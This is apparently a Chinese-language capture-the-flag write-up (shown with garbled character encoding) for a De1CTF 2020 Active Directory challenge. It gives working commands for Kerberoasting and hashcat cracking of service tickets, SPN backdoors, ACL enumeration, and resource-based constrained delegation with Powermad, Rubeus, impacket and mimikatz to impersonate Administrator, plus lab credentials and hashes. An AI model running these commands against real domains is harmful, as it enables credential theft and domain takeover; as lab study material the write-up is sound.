<h4 id="1-ä½¿ç”¨powershellæ¨¡å—Active-Directory"><a href="#1-ä½¿ç”¨powershellæ¨¡å—Active-Directory" class="headerlink" title="(1)ä½¿ç”¨powershellæ¨¡å—Active Directory"></a>(1)ä½¿ç”¨powershellæ¨¡å—Active Directory</h4><p><strong>æ³¨ï¼š</strong></p>
<p>powershellæ¨¡å—Active Directory éœ€è¦æå‰å®‰è£…ï¼ŒåŸŸæ§åˆ¶å™¨ä¸€èˆ¬ä¼šå®‰è£…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>å¯¹äºæœªå®‰è£…Active Directoryæ¨¡å—çš„ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯¼å…¥Active Directoryæ¨¡å—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p>Microsoft.ActiveDirectory.Management.dllåœ¨å®‰è£…powershellæ¨¡å—Active Directoryåç”Ÿæˆï¼Œæˆ‘å·²ç»æå–å‡ºæ¥å¹¶ä¸Šä¼ è‡³githubï¼š</p>
<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<h4 id="2-ä½¿ç”¨PowerView"><a href="#2-ä½¿ç”¨PowerView" class="headerlink" title="(2)ä½¿ç”¨PowerView"></a>(2)ä½¿ç”¨PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<h4 id="3-ä½¿ç”¨kerberoast"><a href="#3-ä½¿ç”¨kerberoast" class="headerlink" title="(3)ä½¿ç”¨kerberoast"></a>(3)ä½¿ç”¨kerberoast</h4><p>powershell:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>vbs:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<p>å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<h3 id="2ã€è¯·æ±‚TGS"><a href="#2ã€è¯·æ±‚TGS" class="headerlink" title="2ã€è¯·æ±‚TGS"></a>2ã€è¯·æ±‚TGS</h3><h4 id="1-è¯·æ±‚æŒ‡å®šTGS"><a href="#1-è¯·æ±‚æŒ‡å®šTGS" class="headerlink" title="(1)è¯·æ±‚æŒ‡å®šTGS"></a>(1)è¯·æ±‚æŒ‡å®šTGS</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DC1.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<h4 id="2-è¯·æ±‚æ‰€æœ‰TGS"><a href="#2-è¯·æ±‚æ‰€æœ‰TGS" class="headerlink" title="(2)è¯·æ±‚æ‰€æœ‰TGS"></a>(2)è¯·æ±‚æ‰€æœ‰TGS</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåè¾“å…¥<code>klist</code>æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨æ®ï¼Œå¯æ‰¾åˆ°è·å¾—çš„TGS</p>
<h3 id="3ã€å¯¼å‡º"><a href="#3ã€å¯¼å‡º" class="headerlink" title="3ã€å¯¼å‡º"></a>3ã€å¯¼å‡º</h3><p>ä½¿ç”¨mimikatz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>

<h3 id="4ã€ç ´è§£"><a href="#4ã€ç ´è§£" class="headerlink" title="4ã€ç ´è§£"></a>4ã€ç ´è§£</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Kerberoastingçš„å®ç°æ–¹æ³•äºŒ"><a href="#0x05-Kerberoastingçš„å®ç°æ–¹æ³•äºŒ" class="headerlink" title="0x05 Kerberoastingçš„å®ç°æ–¹æ³•äºŒ"></a>0x05 Kerberoastingçš„å®ç°æ–¹æ³•äºŒ</h2><hr>
<p>è‡ªåŠ¨å®ç°ï¼Œå¹¶ä¸”ä¸éœ€è¦mimikatzï¼Œæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>ä»£ç åœ°å€ï¼š</p>
<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
<p>ä½¿ç”¨<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>è¯·æ±‚TGSï¼Œåœ¨è¿”å›ç»“æœä¸­æå–å‡ºTGSï¼Œè¾“å‡ºçš„TGSå¯é€‰æ‹©John the Ripperæˆ–Hashcatè¿›è¡Œç ´è§£</p>
<p>å®ä¾‹æ¼”ç¤ºï¼š</p>
<p>åœ¨åŸŸå†…ä¸€å°ä¸»æœºä¸Šä»¥æ™®é€šç”¨æˆ·æƒé™æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>

<p>-AdminCountè¡¨ç¤ºé€‰æ‹©é«˜æƒé™çš„ç”¨æˆ·</p>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-2.png" alt="Alt text"></p>
<p>åªæå–å‡ºhashçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-3.png" alt="Alt text"></p>
<p>ä½¿ç”¨hashcatç ´è§£çš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force</span><br></pre></td></tr></table></figure>

<p>ç ´è§£ç»“æœå¦‚ä¸‹å›¾ï¼ŒæˆåŠŸè·å¾—æ˜æ–‡å£ä»¤<code>MySQLAdmin111!</code></p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-4.png" alt="Alt text"></p>
<p><strong>æ³¨ï¼š</strong></p>
<p>Rubeusä¹Ÿå¯ä»¥å®ç°Invoke-Kerberoastçš„åŠŸèƒ½ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>
<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
<p>å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoastingçš„åé—¨åˆ©ç”¨"><a href="#0x06-Kerberoastingçš„åé—¨åˆ©ç”¨" class="headerlink" title="0x06 Kerberoastingçš„åé—¨åˆ©ç”¨"></a>0x06 Kerberoastingçš„åé—¨åˆ©ç”¨</h2><hr>
<p>åœ¨æˆ‘ä»¬å–å¾—äº†SPNçš„ä¿®æ”¹æƒé™åï¼Œå¯ä»¥ä¸ºæŒ‡å®šçš„åŸŸç”¨æˆ·æ·»åŠ ä¸€ä¸ªSPNï¼Œè¿™æ ·å¯ä»¥éšæ—¶è·å¾—è¯¥åŸŸç”¨æˆ·çš„TGSï¼Œç»è¿‡ç ´è§£åè·å¾—æ˜æ–‡å£ä»¤</p>
<p>ä¾‹å¦‚ä¸ºåŸŸç”¨æˆ·<code>Administrator</code>æ·»åŠ <code>SPNVNC/DC1.test.com</code>ï¼Œå‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-1.png" alt="Alt text"></p>
<p>åœ¨åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºéƒ½èƒ½è·å¾—è¯¥SPNï¼Œå¹¶ä¸”èƒ½å¤Ÿä½¿ç”¨Kerberoastè·å¾—TGSï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-2.png" alt="Alt text"></p>
<p>å†ä½¿ç”¨hashcatç ´è§£å³å¯</p>
<p><strong>è¡¥å……ï¼š</strong></p>
<p>åˆ é™¤SPNçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -D VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è¿™é‡Œç”¨rubeus.exeè¿›è¡ŒKerberoastongæ”»å‡»ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506201311011.png" alt="image-20200506201311011"></p>
<p>æ‹¿åˆ°De1taçš„spn hash,ç„¶åç”¨hashcatæš´åŠ›ç ´è§£hashï¼Œå¯¹åº”çš„å‘½ä»¤å¦‚ä¸‹ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br><span class="line">-a 3 è¡¨ç¤ºæ©ç æ”»å‡» </span><br><span class="line">-m 13100 Kerberos 5 TGS-REP etype 23</span><br><span class="line">åé¢æ˜¯æ©ç å­—ç¬¦é›†</span><br><span class="line">hashcat ç”¨æ³•å¯ä»¥å‚è€ƒhttps:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4008</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212238198.png" alt="image-20200506212238198"></p>
</blockquote>
<p>è¿˜å¯ä»¥è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*De1ta$De1CTF2020.lab$http&#x2F;DM.De1CTF2020.lab*$61050147501E33CBDD5989D54AF1DF7B$346869F1DD94F400AE5C9925D03AA79F11B114AA6304B1ADAA7527796F7A80B4A21D1C0 FD329739F4572C9F0FC05622195960B66199E632715E616A79A92C3EB2CDF16EBB4A48575B3C6138065B2DCF544550C4A670FC5F3A55E61E2FE66762672ABFB9DA87018D91A2BED79EA50FA2AEB3E710339A2A733DDAEBC9017E49019132F99DCC626444E9F91885F539AB23BBB1AD082446B567B8FD29C72708FE6B56252CEA3BE85EACD0433644E9E99E2C8A8930FBB6043E1CD18054E4C948BBB5F0C5F3C9E2EA85E305079CC8CC38049AF88D37AE6211D75A3D06092350799BFFC23B9C4B1EE2BB1C586241374A23170B8F44E64E7A9B6101B780D28ACE1CB67152D54756EF57C21326E1C96B73680E5D495897F6086BBEDA269013C32C27C9029F11746B2B3F2AADFFB1831FA6761020894A81633FD5F8171D49EFDCEA0F89D696C3901A0A62F533BAC8CEDFD7BA77C6FBE095C1383A177D51C46603BDC236EBEF958FA9955226FDB551C0AC76EBDB4575782E215F7C05B1727107EC4B5468C92D3414BA53659E1A6A53F2E8608D9696AB0E11F32658DD9012AF96B74B2B8DE441FFADA666FA30012636B21C0AD46576F30467FD9C8923BEF4A9F37FCD4142E03423F692E7F9C36BD3626E3AA066C3254EADA1BDEB7B51B2EB256A4B79235D5854401CC9F73290352E550E41CE23C394A93FCBFBE35C398145E75FA64F1CE09A0B866F401B79351122DFCB1096999C879334C8D95F5B41601C713D6DA4ECB024D55680E8E71BED081EA48152561770DE047EBE017B10615A3DF335B3432718E3D000ECBBD21EFECF0D705B15C67763B4841BFA4EE6C78ED823B3A039E159DC16E024972E6EDFC7BE3057DF2EBA5C37274AE8753AA3675E02E5C52F8ABFFAD4B1B2DD97613092269E28370609DC24F295F5B769BED8AB95BE971B12B60608BCFB191BAC206D56AF13D5793B3F795AED53F7DF5D80056BC7799E223F7627EC8572AF324613813A8DBC78CC6DDAF85148A99C05BF802F63E64A77DE4BB9A0DC8B7DCDA97B80CDFCE0138EE81B1808F8F8BB4AAD3EF9CABAE504699F86938325C9D8C181FA66C95C986AE9D34D7B3DD15F2FAA29149815D3581F6462508D81D4A275F128A38C1DC8CEB54C2B8B98445DDE60C7469B598C172278A0BB6E17967998131712B55ACD27F0369133140E57A100CECB2625402F23CA3F246EACEEE638F1BC518CD0EDBA8B94492795833B1DB5D9F7C46DC4EA6014C750276F07190F181951918F028FB0CA4CB1617FC5E5EF7DBCD09D59E26C76B6AA7CC36D5A2EBF8670E018CCC1E3BE7E1D58E6FC798323421A3424562B9E14B325E50B36B14C8A4B3F42B43CF40DD73DF235F1B87FA6F2578767739608791CF4706140F02CE03F523A06069DA1C293E9BED7B188EEF41 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212308372.png" alt="image-20200506212308372"></p>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224335368.png" alt="image-20200506224335368"></p>
<p>å‰é¢å·²ç»æç¤ºäº†De1taæœ‰ç‰¹æ®Šçš„æ‰©å±•æƒé™ï¼Œç„¶åå†ç”¨adfindå»æŸ¥çœ‹De1taçš„aclæƒé™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br><span class="line">AdFind.exe -s subtree -b "dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506085227520.png" alt="image-20200506085227520"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224719242.png" alt="image-20200506224719242"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾æ¡†ä¸­çš„ä¸‰ä¸ªæƒé™(Add/Remove Replica In Domainã€Replication Synchronizationã€Manage Replication Topology)ï¼Œå¤§ä½¬è¯´ä¸Šé¢ä¸‰ä¸ªæƒé™å¯ä»¥è¿›è¡ŒDCShadowæ”»å‡»ï¼Œå…·ä½“æ”»å‡»åŸç†å¯ä»¥çœ‹<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>è¿™ç¯‡æ–‡ç« ï¼Œ</p>
<blockquote>
<p>ä½†æ˜¯å•å•ä¸‰ä¸ªæƒé™è¿˜æ˜¯ä¸æ»¡è¶³Dcshadowçš„æ¡ä»¶çš„ï¼Œè¿˜è¦å¯¹å½“å‰ä¸»æœºå±æ€§å…·æœ‰å†™æƒé™ä»¥åŠå¯¹<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>å®¹å™¨å…·æœ‰<code>Create Child</code>å’Œ<code>Delete Chind</code>æƒé™ã€‚ç„¶åå†æ”¶é›†ä¸€æ³¢ç›¸å…³çš„ACL</p>
<p>å‘ç°De1taç”¨æˆ·å¯¹<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>å®¹å™¨å…·æœ‰<code>Create Child</code>å’Œ<code>Delete Chind</code>æƒé™</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=sites,cn=Configuration,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225825119.png" alt="image-20200506225825119"></p>
<p>ç»§ç»­æŸ¥çœ‹De1taå¯¹å½“å‰ä¸»æœºDMå±æ€§å…·æœ‰å†™æƒé™ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509171231727.png" alt></p>
<p>å³å¯è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=dm,cn=computers,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225952439.png" alt="image-20200506225952439"></p>
<p>ç„¶åé€šè¿‡åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å¯¹å½“å‰ä¸»æœºè¿›è¡Œæœ¬åœ°ææƒã€‚<a href="http://redteam.today/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" target="_blank" rel="noopener">è¯¦ç»†åŸç†å‚è€ƒ</a>ï¼Œå¦å¤–è¿˜æœ‰è§†é¢‘<a href="https://www.youtube.com/watch?v=RUbADHcBLKg" target="_blank" rel="noopener">æ“ä½œ</a></p>
<p>è¿™é‡Œé¦–å…ˆç”¨klist purgeå‘½ä»¤æŠŠç™»å½•ä¼šè¯çš„æ‰€æœ‰ç¥¨è¯æ¸…ç©ºï¼Œç„¶å</p>
<blockquote>
<p>klistè¯­æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">klist [-lh &lt;LogonId.HighPart&gt;] [-li &lt;LogonId.LowPart&gt;] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507230043568.png" alt="image-20200508082613787"></p>
<p>ä¹‹åè¯·æ±‚ä¸€ä¸ªTGT,å¹¶å¯¼å…¥ä¼šè¯ä¸­ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:de1ta &#x2F;password:3f23ea12 &#x2F;domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508082613787.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225359017.png" alt="image-20200507225359017"></p>
<p>ç„¶åklistæŸ¥è¯¢ä¸‹ç¥¨æ®ï¼Œå¯ä»¥çœ‹è§</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225504011.png" alt="image-20200507225504011"></p>
<p>ä¹‹åå‚è€ƒè¿™ç¯‡<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œè¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ï¼Œé¦–å…ˆä½¿ç”¨<a href="https://github.com/Kevin-Robertson" target="_blank" rel="noopener">Kevin-Robertson</a>/<strong><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></strong>æ¥æ·»åŠ ä¸€ä¸ªè´¦å·</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount mount -Password $(ConvertTo-SecureString "mount" -AsPlainText -Force)  </span><br><span class="line"><span class="meta">#</span><span class="bash">ä¸‹å›¾ä¸ºevil,å¯¹åº”æ”¹æˆmountå³å¯</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507231145442.png" alt="image-20200507231145442"></p>
<p>ç„¶ååˆ©ç”¨powerviewçš„Get-DomainComputerå¾—åˆ°mountçš„sidã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508083733914.png" alt="image-20200508083733914"></p>
<p>ç„¶åè®¾ç½®DMçš„msds-allowedtoactonbehalfofotheridentityå±æ€§ï¼Œæ·»åŠ æ–°å»ºçš„mountï¼Œè¾¾åˆ°å¯ä»¥è®©mountå¯ä»¥æ¨¡æ‹Ÿä»»æ„ç”¨æˆ·è®¿é—®DMçš„æœåŠ¡ï¼Œå³åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»è¿›è¡Œææƒã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1129)"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);</span></span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091157144.png" alt="image-20200508091157144"></p>
<p>å¯ä»¥åˆ©ç”¨powerviewçš„å¦‚ä¸‹å‘½ä»¤æ¥æ£€æµ‹æ˜¯å¦è®¾ç½®æˆåŠŸï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">RawBytes = Get-DomainComputer DM -Properties <span class="string">'msds-allowedtoactonbehalfofotheridentity'</span> | select -expand msds-allowedtoactonbehalfofotheridentity; <span class="variable">$Descriptor</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="variable">$RawBytes</span>,0; <span class="variable">$Descriptor</span>.DiscretionaryAcl</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508100355469.png" alt="image-20200508100355469"></p>
<p>ç„¶ååœ¨ç”Ÿæˆå¯¹åº”çš„ç™½é“¶ç¥¨æ®ï¼ˆä¼ªé€ çš„tgsï¼‰,å‚è€ƒå…ˆçŸ¥çš„<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">æ–‡ç« è¦</a>åˆ†åˆ«ç”Ÿæˆï¼ˆcifs,hostï¼‰ä¸¤ä¸ªç¥¨æ®ï¼Œè¿™é‡Œé‡‡ç”¨rubeus.exeæ¥è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ©ç”¨ï¼Œå› ä¸ºrubeus.exeä¸æ”¯æŒæ˜æ–‡ï¼Œæ‰€ä»¥é¦–å…ˆç”Ÿæˆhashã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:mount /password:mount /domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508090928722.png" alt="image-20200508090928722"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:mount$ /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:Administrator /msdsspn:cifs/dm /ptt </span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /user:mount /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:administrator /msdsspn:host/dm /ptt </span><br><span class="line"><span class="meta">#</span><span class="bash">rubeusçš„ç”¨æ³•å‚è€ƒ https://github.com/GhostPack/Rubeus<span class="comment">#s4u</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091546798.png" alt="image-20200508091546798"></p>
<p>ä¹‹åklistæ£€æŸ¥ç¥¨æ®</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091629160.png" alt="image-20200508091629160"></p>
<p>ç„¶åæµ‹è¯•æ•ˆæœ</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130415846.png" alt="image-20200509130415846" style="zoom:150%;">

<p>å¤±è´¥ï¼Œ<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">çœ‹å‡ºé¢˜äººåšå®¢ä¹Ÿè¯´</a>rubeus çš„ä¸å¯ä»¥ï¼Œ</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130808887.png" alt="image-20200509130808887" style="zoom:150%;">

<p>ç„¶åå¼€å§‹ç”¨impacketï¼Œè¿™é‡Œè¦ç”¨pyinstalleræŠŠimpacketçš„ç¨‹åºæ‰“åŒ…ï¼Œgithubä¸Šé¢ä¹Ÿæœ‰ç°æˆçš„ï¼Œ</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getST.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"><span class="meta">$</span><span class="bash">env:KRB5CCNAME=<span class="string">"Administrator.ccache"</span></span></span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"></span><br><span class="line">setenv KRB5CCNAME  Administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec.exe -no-pass -k -debug dm shell.exe</span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ–</span></span><br><span class="line">smbexec.exe -no-pass -k -debug dm  </span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ–</span></span><br><span class="line">PsExec64.exe  \\dm -s cmd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚æ•°ï¼š</p>
<p>-impersonateï¼šè¡¨ç¤ºä¼ªé€ ç”¨æˆ·</p>
<p>-spnï¼šè¡¨ç¤ºæˆ‘ä»¬è¦å§”æ´¾çš„æœåŠ¡çš„spnï¼Œè¿™é‡Œæ˜¯cifs</p>
<p>-dc-ipï¼šåŸŸæ§ip</p>
<p>æ‰§è¡Œä¹‹åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªç¼“å­˜æ–‡ä»¶Administrator.ccache</p>
<p>-no-pass</p>
</blockquote>
<p>æ‰§è¡Œwmiexec.exeç­‰éƒ½æ²¡æœ‰æˆåŠŸï¼Œç„¶ååˆ©ç”¨mimikatz.exeæŠŠAdministrator.ccacheå¯¼å…¥ä¼šè¯ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;privilege::debug&quot;  &quot;kerberos::ptc Administrator.ccache&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141628302.png" alt="image-20200509141628302"></p>
<p>ç„¶ååœ¨è¿è¡Œï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141847581.png" alt="image-20200509141847581"></p>
<p>å‡ºç°è¿™ä¸ªé”™è¯¯åŸå› å¯èƒ½<a href="http://t3ngyu.leanote.com/tag/Pth" target="_blank" rel="noopener">æ˜¯</a>ä»€ä¹ˆç»„å†Œè¡¨ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œè¦æ”¹æ³¨å†Œè¡¨ï¼Œä½†æ˜¯æ— æƒé™ï¼Œpthå§ï¼Œæ²¡æœ‰administratorçš„hashï¼Œçˆ¬ã€‚</p>
<blockquote>
